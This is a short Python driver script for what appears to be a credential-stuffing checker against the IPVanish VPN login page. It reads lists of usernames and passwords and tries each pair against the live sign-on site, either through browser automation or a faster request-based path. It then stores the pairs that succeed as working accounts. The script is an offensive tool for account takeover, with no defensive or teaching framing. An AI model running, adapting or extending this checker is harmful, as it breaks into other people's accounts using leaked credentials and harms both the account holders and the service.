import time
from gui import text_user_interface
from header import title
from browser_init import BrowserInit
from requests_checker import RequestsChecker

if __name__ == '__main__':
    title()
    directory = "/home/roberto/Desktop/cookie.json"
    page = "https://sso.ipvanish.com/"

    loop_ends = False
    counter = 0
    TUI = text_user_interface()
    while not loop_ends:
        match TUI:
            case "1":
                while True:
                    browser = BrowserInit(page)
                    user, password = browser.get_and_split_list()
                    if counter == len(user):
                        loop_ends = True
                        break
                    browser.open_page_and_enter_credentials(user[counter], password[counter])
                    time.sleep(8)
                    browser.check_validity_and_store_if_valid(user[counter], password[counter])
                    counter += 1
            case "2":
                while True:
                    fast_checker = RequestsChecker()
                    user, password = fast_checker.split_list()
                    if counter == len(user):
                        loop_ends = True
                        break
                    fast_checker.make_request(user[counter], password[counter])
                    counter += 1
            case _:
                print("Invalid Choice.")
                input("Press Enter...")
                print("\1xbc")
